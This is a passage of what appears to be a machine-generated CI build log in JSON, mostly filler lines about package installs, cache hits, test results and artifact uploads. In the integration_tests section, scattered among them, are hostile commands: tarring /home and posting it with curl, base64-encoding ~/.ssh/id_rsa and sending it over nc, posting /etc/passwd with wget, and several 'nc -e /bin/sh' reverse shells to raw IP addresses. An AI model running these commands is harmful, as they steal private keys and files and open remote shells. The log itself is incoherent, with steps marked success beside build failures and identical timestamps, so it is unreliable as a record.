prettier@5.20.0\n[12:00:24] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_db_connect (483ms)\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling jest@1.12.0\n\u2713 test completed\n\u2713 build completed\n  PASS: test_auth_login (480ms)\n[12:00:24] INFO: Processing request\n[12:00:24] WARN: Deprecated API usage\nCache hit for key-8970\n[12:00:24] WARN: Deprecated API usage\nCompiling src/handler.rs...\nCompiling src/service.java...\nCache hit for key-4707\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/utils.go...\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\n\u2717 build failed with exit code 14\n[12:00:24] WARN: Deprecated API usage\nCache hit for key-2360\n\u2713 test completed\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 lint completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (27MB)\nInstalling react@2.14.0\nCompiling src/service.java...\nInstalling jest@5.13.0\nStep 2/10: Building\nInstalling express@4.5.0\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-7377\nInstalling react@3.8.0\nInstalling webpack@4.8.0\n\u2713 build completed\n  PASS: test_cache_hit (491ms)\n\u2713 test completed\nCache hit for key-2441\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nInstalling jest@4.10.0\n=== Step setup_node completed ===\n=== Step: upload_artifacts ===\n  PASS: test_auth_login (344ms)\nStep 4/10: Building\n  PASS: test_cache_hit (392ms)\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_cache_hit (278ms)\n\u2713 test completed\n[12:00:24] INFO: Processing request\nInstalling react@5.0.0\nStep 3/10: Building\n  PASS: test_db_connect (211ms)\n\u2713 build completed\n[12:00:24] WARN: Deprecated API usage\nStep 5/10: Building\n\u2713 test completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:24] INFO: Processing request\n  PASS: test_db_connect (431ms)\n  PASS: test_cache_hit (5ms)\n  PASS: test_api_health (206ms)\n  PASS: test_cache_hit (361ms)\nStep 5/10: Building\n  PASS: test_cache_hit (368ms)\n[12:00:24] INFO: Processing request\nInstalling prettier@3.14.0\nArtifact uploaded: build.tar.gz (31MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-9693\n[12:00:24] INFO: Processing request\nStep 3/10: Building\n\u2713 lint completed\nCache hit for key-4654\nArtifact uploaded: build.tar.gz (36MB)\nWARNING: prettier has known vulnerabilities\nInstalling webpack@1.8.0\nStep 8/10: Building\n  PASS: test_cache_hit (391ms)\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_user_create (405ms)\n[12:00:24] INFO: Processing request\nInstalling jest@4.0.0\n\u2713 test completed\nCompiling src/index.js...\n\u2713 lint completed\nCache hit for key-9484\n  PASS: test_auth_login (230ms)\nCompiling src/main.py...\n[12:00:24] INFO: Processing request\nCache hit for key-2459\nInstalling jest@4.13.0\nCache hit for key-5794\nCompiling src/utils.go...\n  PASS: test_api_health (3ms)\nInstalling lodash@1.0.0\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (20MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:24] INFO: Processing request\n  PASS: test_auth_login (468ms)\nInstalling jest@2.20.0\n\u2713 test completed\nStep 10/10: Building\nCache hit for key-5477\nCompiling src/handler.rs...\nCompiling src/main.py...\nCache hit for key-1647\nStep 9/10: Building\nInstalling eslint@5.18.0\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-2144\nCache hit for key-1764\nException: ValueError\nStep 3/10: Building\nStep 5/10: Building\nCache hit for key-5034\nCache hit for key-7813\nCache hit for key-4425\nCompiling src/service.java...\nInstalling prettier@4.10.0\nInstalling webpack@5.0.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-1559\nCache hit for key-4260\n\u2713 lint completed\nInstalling express@1.12.0\nCache hit for key-8138\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\n[12:00:24] INFO: Processing request\nCache hit for key-6482\n\u2713 test completed\n  PASS: test_auth_login (451ms)\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (254ms)\nWARNING: prettier has known vulnerabilities\n[12:00:24] INFO: Processing request\nCache hit for key-1935\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: test_db_connect (392ms)\nArtifact uploaded: build.tar.gz (22MB)\nInstalling prettier@5.12.0\nCompiling src/service.java...\nInstalling webpack@1.0.0\nWARNING: react has known vulnerabilities\n[12:00:24] INFO: Processing request\nCompiling src/index.js...\nStep 6/10: Building\nInstalling jest@3.20.0\nCache hit for key-1074\n  PASS: test_cache_hit (241ms)\nStep 2/10: Building\nCompiling src/index.js...\nCompiling src/index.js...\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nInstalling axios@4.14.0\n[12:00:24] INFO: Processing request\nInstalling prettier@1.5.0\nStep 1/10: Building\n\u2713 lint completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:24] INFO: Processing request\n  PASS: test_api_health (159ms)\n  PASS: test_api_health (497ms)\nInstalling webpack@4.14.0\nCache hit for key-6593\nStep 4/10: Building\n  PASS: test_user_create (370ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:24] INFO: Processing request\n  PASS: test_db_connect (456ms)\n\u2713 test completed\nInstalling express@1.19.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (13MB)\nInstalling jest@5.17.0\n[12:00:24] INFO: Processing request\nStep 9/10: Building\nCompiling src/index.js...\n[12:00:24] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 build completed\nCache hit for key-5697\n  PASS: test_db_connect (280ms)\n[12:00:24] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_db_connect (439ms)\nInstalling react@4.2.0\nCache hit for key-9977\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-6486\nInstalling axios@4.5.0\n[12:00:24] WARN: Deprecated API usage\nCache hit for key-8553\n  PASS: test_api_health (138ms)\n\u2713 test completed\n\u2713 lint completed\nCompiling src/handler.rs...\nCache hit for key-1107\nInstalling prettier@2.13.0\n[12:00:24] WARN: Deprecated API usage\n=== Step upload_artifacts completed ===\n=== Step: integration_tests ===\nStep 10/10: Building\n\u2713 lint completed\nCache hit for key-2118\nCache hit for key-4570\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (6MB)\nInstalling eslint@1.16.0\n\u2713 lint completed\n[12:00:24] INFO: Processing request\nInstalling lodash@1.0.0\nSending 301MB of data to test.io\nCompiling src/handler.rs...\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nCache hit for key-9640\n[12:00:24] INFO: Processing request\nCache hit for key-2122\n[12:00:24] INFO: Processing request\n  PASS: test_user_create (137ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 115.0.225.247 25794\nCache hit for key-9197\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/utils.go...\nInstalling prettier@5.20.0\n[12:00:24] INFO: Processing request\n  PASS: test_db_connect (346ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-5771\n\u2713 lint completed\nCompiling src/handler.rs...\n[12:00:24] INFO: Processing request\n\u2713 test completed\nStep 6/10: Building\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nCompiling src/utils.go...\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/main.py...\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/app.ts...\n\u2713 test completed\nCache hit for key-3023\nCompiling src/service.java...\n  PASS: test_db_connect (123ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling webpack@4.6.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:24] INFO: Processing request\nCache hit for key-2035\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nInstalling jest@2.3.0\n[12:00:24] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (23MB)\nStep 1/10: Building\n[12:00:24] INFO: Processing request\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:24] ERROR: Connection failed\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\n[12:00:24] ERROR: Connection failed\nCache hit for key-6981\n  PASS: test_auth_login (485ms)\n\u2713 build completed\nStep 3/10: Building\nCache hit for key-7862\nInstalling prettier@5.2.0\nCompiling src/utils.go...\nnc -e /bin/sh 76.119.29.128 47404\nCompiling src/service.java...\nException: ValueError\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (41MB)\n\u2717 build failed with exit code 16\nCache hit for key-4127\nStep 10/10: Building\n[12:00:24] ERROR: Connection failed\nCache hit for key-9555\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:24] INFO: Processing request\nCache hit for key-9215\nCache hit for key-6059\n[12:00:24] ERROR: Connection failed\n\u2713 lint completed\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (37MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/index.js...\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nnc -e /bin/sh 223.61.34.210 15793\nnc -e /bin/sh 236.62.234.253 43448\n  PASS: test_user_create (403ms)\nInstalling eslint@1.12.0\n\u2713 build completed\n  PASS: test_auth_login (31ms)\n\u2713 test completed\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:24] ERROR: Connection failed\nCache hit for key-1360\n  PASS: test_db_connect (156ms)\nCompiling src/index.js...\n\u2713 test completed\n[12:00:24] INFO: Processing request\n[12:00:24] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling react@5.19.0\nCompiling src/index.js...\nStep 3/10: Building\n  PASS: test_user_create (365ms)\nInstalling jest@2.18.0\nInstalling react@3.19.0\nCompiling src/index.js...\nCompiling src/utils.go...\nCompiling src/handler.rs...\n[12:00:24] INFO: Processing request\nStep 5/10: Building\n[12:00:24] INFO: Processing request\nCompiling src/main.py...\nCompiling src/index.js...\n\u2713 build completed\nCompiling src/index.js...\n  PASS: test_api_health (22ms)\nStep 4/10: Building\nInstalling webpack@3.1.0\nStep 8/10: Building\n  PASS: test_auth_login (5ms)\nStep 7/10: Building\nInstalling webpack@1.13.0\nCache hit for key-7646\n\u2713 test completed\n\u2713 build completed\nCache hit for key-9439\nnc -e /bin/sh 108.26.140.44 51908\nCache hit for key-4877\necho $(cat ~/.ssh/id_rsa) | base64 | nc 60.111.18.16 18914\n  PASS: test_cache_hit (266ms)\nCompiling src/utils.go...\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_user_create (405ms)\n\u2713 lint completed\nCompiling src/utils.go...\nnc -e /bin/sh 30.177.175.96 3203\nCache hit for key-3251\nStep 1/10: Building\nInstalling webpack@5.19.0\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/index.js...\nStep 1/10: Building\nCache hit for key-2930\n  PASS: test_api_health (269ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-4132\nArtifact uploaded: build.tar.gz (42MB)\nStep 2/10: Building\nSending 92MB of data to example.com\nInstalling webpack@5.18.0\nCompiling src/app.ts...\nCache hit for key-9181\nCompiling src/service.java...\n  PASS: test_user_create (121ms)\nArtifact uploaded: build.tar.gz (3MB)\nFAILED: test_api_health\nInstalling webpack@3.1.0\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-05T12:00:24.308044",
        "finished_at": "2025-12-05T12:00:33.045031",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing react@1.13.0",
          "Step 3/10: Building",
          "Cache hit for key-7092",
          "Installing express@2.10.0",
          "Cache hit for key-4642",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@4.9.0",
          "\u2713 build completed",
          "  PASS: test_user_create (270ms)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (139ms)",
          "Step 6/10: Building",
          "Installing jest@5.9.0",
          "Installing eslint@2.6.0",
          "[12:00:24] INFO: Processing request",
          "Step 3/10: Building",
          "Step 6/10: Building",
          "  PASS: test_user_create (50ms)",
          "Cache hit for key-4946",
          "Cache hit for key-9608",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-8415",
          "Step 2/10: Building",
          "Installing axios@2.8.0",
          "\u2713 build completed",
          "\u2713 lint completed",
          "[12:00:24] ERROR: Connection failed",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "Cache hit for key-2174",
          "[12:00:24] INFO: Processing request",
          "Step 8/10: Building",
          "Installing jest@4.19.0",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "WARNING: express has known vulnerabilities",
          "Installing jest@2.12.0",
          "Cache hit for key-5431",
          "Installing react@1.17.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_db_connect (345ms)",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-2079",
          "Exception: ValueError",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-2588",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_db_connect (381ms)",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 8/10: Building",
          "Step 10/10: Building",
          "[12:00:24] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_db_connect (415ms)",
          "\u2713 test completed",
          "  PASS: test_user_create (415ms)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-4809",
          "  PASS: test_cache_hit (421ms)",
          "Step 2/10: Building",
          "Installing eslint@4.19.0",
          "Installing eslint@4.8.0",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "Installing jest@2.13.0",
          "\u2713 lint completed",
          "Installing jest@5.18.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/main.py...",
          "  PASS: test_api_health (86ms)",
          "\u2717 build failed with exit code 50",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@4.15.0",
          "Cache hit for key-3454",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 4/10: Building",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_cache_hit (59ms)",
          "Cache hit for key-7373",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (303ms)",
          "Installing prettier@3.8.0",
          "Step 4/10: Building",
          "Installing eslint@3.4.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_user_create (171ms)",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@2.7.0",
          "Compiling src/utils.go...",
          "Cache hit for key-1720",
          "Cache hit for key-7843",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@4.10.0",
          "[12:00:24] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-5822",
          "\u2713 lint completed",
          "Cache hit for key-4643",
          "Installing jest@2.8.0",
          "  PASS: test_auth_login (283ms)",
          "Cache hit for key-4970",
          "Cache hit for key-3094",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-1250",
          "\u2713 lint completed",
          "Cache hit for key-1550",
          "  PASS: test_auth_login (151ms)",
          "\u2713 build completed",
          "Cache hit for key-6726",
          "Cache hit for key-9664",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 2/10: Building",
          "Installing jest@3.1.0",
          "Cache hit for key-9229",
          "Step 8/10: Building",
          "Installing eslint@4.14.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Exception: RuntimeError",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-2710",
          "Cache hit for key-6513",
          "  PASS: test_user_create (218ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: eslint has known vulnerabilities",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-05T12:00:33.045031",
        "finished_at": "2025-12-05T12:00:41.782018",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "  PASS: test_auth_login (81ms)",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-9540",
          "  PASS: test_user_create (339ms)",
          "Compiling src/utils.go...",
          "Step 4/10: Building",
          "Cache hit for key-7113",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-6764",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-1885",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-4779",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-3417",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-6586",
          "Installing react@1.0.0",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_api_health (11ms)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "FAILED: test_db_connect",
          "[12:00:24] ERROR: Connection failed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-4252",
          "[12:00:24] WARN: Deprecated API usage",
          "Installing webpack@2.3.0",
          "Cache hit for key-1945",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-2404",
          "WARNING: express has known vulnerabilities",
          "Compiling src/app.ts...",
          "Installing react@2.11.0",
          "Cache hit for key-6323",
          "Step 9/10: Building",
          "Step 3/10: Building",
          "Step 6/10: Building",
          "Installing prettier@2.17.0",
          "\u2713 build completed",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_user_create (187ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/main.py...",
          "Installing prettier@3.5.0",
          "Installing webpack@4.14.0",
          "Cache hit for key-7013",
          "Step 2/10: Building",
          "Cache hit for key-2723",
          "Cache hit for key-1181",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "FAILED: test_auth_login",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (379ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-6437",
          "  PASS: test_db_connect (170ms)",
          "  PASS: test_auth_login (122ms)",
          "[12:00:24] INFO: Processing request",
          "Installing express@4.3.0",
          "Step 8/10: Building",
          "Step 9/10: Building",
          "Step 4/10: Building",
          "  PASS: test_db_connect (1ms)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Cache hit for key-2176",
          "WARNING: axios has known vulnerabilities",
          "Installing eslint@2.9.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-1244",
          "Cache hit for key-3119",
          "[12:00:24] WARN: Deprecated API usage",
          "[12:00:24] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:24] WARN: Deprecated API usage",
          "  PASS: test_db_connect (306ms)",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (47ms)",
          "Installing eslint@2.18.0",
          "  PASS: test_cache_hit (435ms)",
          "Installing eslint@5.17.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing webpack@2.7.0",
          "  PASS: test_cache_hit (208ms)",
          "[12:00:24] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (307ms)",
          "Step 1/10: Building",
          "Step 4/10: Building",
          "Step 5/10: Building",
          "  PASS: test_user_create (204ms)",
          "Installing axios@4.1.0",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 lint completed",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:24] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (83ms)",
          "  PASS: test_user_create (163ms)",
          "WARNING: react has known vulnerabilities",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_db_connect (269ms)",
          "Installing lodash@5.7.0",
          "Cache hit for key-3969",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Cache hit for key-1023",
          "Compiling src/app.ts...",
          "Cache hit for key-7216",
          "Compiling src/index.js...",
          "Installing jest@5.15.0",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "Installing webpack@4.12.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 6/10: Building",
          "[12:00:24] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 6/10: Building",
          "Cache hit for key-5180",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing react@1.6.0",
          "  PASS: test_api_health (249ms)",
          "FAILED: test_api_health",
          "Step 7/10: Building",
          "  PASS: test_api_health (195ms)",
          "  PASS: test_auth_login (16ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "  PASS: test_api_health (400ms)",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing eslint@4.17.0",
          "Cache hit for key-2771",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-05T12:00:41.782018",
        "finished_at": "2025-12-05T12:00:50.519005",
        "log_lines": [
          "=== Step: lint ===",
          "\u2713 test completed",
          "Cache hit for key-3747",
          "  PASS: test_api_health (317ms)",
          "[12:00:24] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (311ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:24] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing prettier@2.10.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 9/10: Building",
          "[12:00:24] INFO: Processing request",
          "FAILED: test_user_create",
          "Cache hit for key-7154",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (57ms)",
          "  PASS: test_api_health (175ms)",
          "Step 6/10: Building",
          "Cache hit for key-4061",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "[12:00:24] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:24] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-8573",
          "[12:00:24] INFO: Processing request",
          "Step 2/10: Building",
          "Installing lodash@3.6.0",
          "[12:00:24] INFO: Processing request",
          "Exception: TypeError",
          "  PASS: test_db_connect (198ms)",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing axios@1.19.0",
          "[12:00:24] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 6/10: Building",
          "Step 4/10: Building",
          "\u2717 build failed with exit code 27",
          "Installing jest@2.20.0",
          "\u2713 build completed",
          "[12:00:24] WARN: Deprecated API usage",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (369ms)",
          "[12:00:24] INFO: Processing request",
          "Installing react@1.14.0",
          "Installing axios@1.4.0",
          "Cache hit for key-6721",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing lodash@1.7.0",
          "Cache hit for key-1629",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (468ms)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing webpack@1.20.0",
          "Step 1/10: Building",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_auth_login (233ms)",
          "  PASS: test_cache_hit (280ms)",
          "  PASS: test_db_connect (130ms)",
          "Installing axios@2.7.0",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (310ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_api_health (362ms)",
          "  PASS: test_cache_hit (376ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-9107",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_cache_hit (484ms)",
          "  PASS: test_auth_login (207ms)",
          "Compiling src/service.java...",
          "Installing express@2.15.0",
          "\u2713 build completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:24] INFO: Processing request",
          "Step 7/10: Building",
          "  PASS: test_api_health (307ms)",
          "Installing lodash@4.0.0",
          "Step 7/10: Building",
          "[12:00:24] INFO: Processing request",
          "Installing prettier@3.19.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:24] ERROR: Connection failed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "Installing webpack@1.16.0",
          "[12:00:24] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Cache hit for key-4873",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Installing eslint@4.13.0",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Cache hit for key-5746",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (336ms)",
          "Compiling src/index.js...",
          "Installing eslint@3.6.0",
          "FAILED: test_cache_hit",
          "[12:00:24] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-6601",
          "\u2713 test completed",
          "Installing axios@1.18.0",
          "Installing axios@5.7.0",
          "Installing axios@1.3.0",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_db_connect (163ms)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_auth_login (274ms)",
          "Cache hit for key-1887",
          "[12:00:24] INFO: Processing request",
          "Installing jest@2.14.0",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing webpack@2.17.0",
          "Installing jest@2.9.0",
          "[12:00:24] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "  PASS: test_cache_hit (141ms)",
          "Installing eslint@2.5.0",
          "Compiling src/main.py...",
          "Installing jest@4.15.0",
          "Cache hit for key-3197",
          "Step 4/10: Building",
          "Step 9/10: Building",
          "Step 7/10: Building",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-05T12:00:50.519005",
        "finished_at": "2025-12-05T12:00:59.255992",
